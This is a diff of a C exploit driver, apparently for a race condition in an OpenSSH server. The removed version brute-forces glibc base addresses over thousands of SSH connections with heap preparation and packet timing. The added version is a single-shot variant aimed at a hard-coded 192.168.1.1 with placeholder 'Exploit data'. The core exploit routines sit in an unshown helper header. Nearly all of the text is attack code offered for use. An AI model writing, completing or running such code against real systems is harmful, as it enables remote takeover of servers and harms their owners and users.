@@ -1,74 +1,66 @@
-#include <stdlib.h>
-#include <unistd.h>
-#include <time.h>
-#include <string.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <stdint.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <sys/socket.h>
-#include <netinet/in.h>
 #include <arpa/inet.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
 #include <time.h>
 #include "helper.h"
 
-#define MAX_PACKET_SIZE (256 * 1024)
-#define LOGIN_GRACE_TIME 120
-#define MAX_STARTUPS 100
-#define CHUNK_ALIGN(s) (((s) + 15) & ~15)
+int main() {
+    int sock;
+    struct sockaddr_in server;
+    char buffer[1024];
 
-int perform_ssh_handshake(int sock);  // Deklarasi fungsi
-int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base);  // Deklarasi fungsi
-
-int main(int argc, char *argv[]) {
-    if (argc != 3) {
-        fprintf(stderr, "Usage: %s <ip> <port>\n", argv[0]);
-        exit(1);
+    // Membuat socket
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("Socket creation failed");
+        return -1;
     }
 
-    const char *ip = argv[1];
-    int port = atoi(argv[2]);
-    double parsing_time = 0;
-    int success = 0;
+    // Mengatur server address
+    server.sin_family = AF_INET;
+    server.sin_port = htons(12345);
+    server.sin_addr.s_addr = inet_addr("192.168.1.1");
 
-    srand(time(NULL));
-
-    // Attempt exploitation for each possible glibc base address
-    for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++) {
-        uint64_t glibc_base = GLIBC_BASES[base_idx];
-        printf("Attempting exploitation with glibc base: 0x%lx\n", glibc_base);
-
-        // The advisory mentions "~10,000 tries on average"
-        for (int attempt = 0; attempt < 20000 && !success; attempt++) {
-            if (attempt % 1000 == 0) {
-                printf("Attempt %d of 20000\n", attempt);
-            }
-
-            int sock = setup_connection(ip, port);
-            if (sock < 0) {
-                fprintf(stderr, "Failed to establish connection, attempt %d\n", attempt);
-                continue;
-            }
-
-            if (perform_ssh_handshake(sock) < 0) {
-                fprintf(stderr, "SSH handshake failed, attempt %d\n", attempt);
-                close(sock);
-                continue;
-            }
-
-            prepare_heap(sock);
-            time_final_packet(sock, &parsing_time);
-
-            if (attempt_race_condition(sock, parsing_time, glibc_base)) {
-                printf("Possible exploitation success on attempt %d with glibc base 0x%lx!\n", attempt, glibc_base);
-                success = 1;
-                break;
-            }
-
-            close(sock);
-            usleep(100000); // 100ms delay between attempts, as mentioned in the advisory
-        }
+    // Menghubungkan ke server
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
+        perror("Connection failed");
+        return -1;
     }
 
-    return !success;
+    // Menyiapkan data untuk dikirim
+    snprintf(buffer, sizeof(buffer), "Exploit data");
+
+    // Menghitung waktu pengiriman
+    struct timespec start, end;
+    clock_gettime(CLOCK_MONOTONIC, &start);
+
+    if (send_packet(sock, buffer, strlen(buffer)) < 0) {
+        perror("send_packet failed");
+        return -1;
+    }
+
+    clock_gettime(CLOCK_MONOTONIC, &end);
+    double elapsed_time = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1000000000.0;
+    printf("Estimated parsing time: %f seconds\n", elapsed_time);
+
+    // Melakukan handshake SSH dan mencoba kondisi balapan
+    if (perform_ssh_handshake(sock) < 0) {
+        perror("SSH handshake failed");
+        return -1;
+    }
+
+    printf("Attempting race condition...\n");
+
+    unsigned long glibc_base = 0xb7200000;  // Contoh base address
+    if (attempt_race_condition(sock, elapsed_time, glibc_base)) {
+        printf("Possible exploitation success on attempt 0 with glibc base 0x%lx!\n", glibc_base);
+    }
+
+    close(sock);
+    return 0;
 }
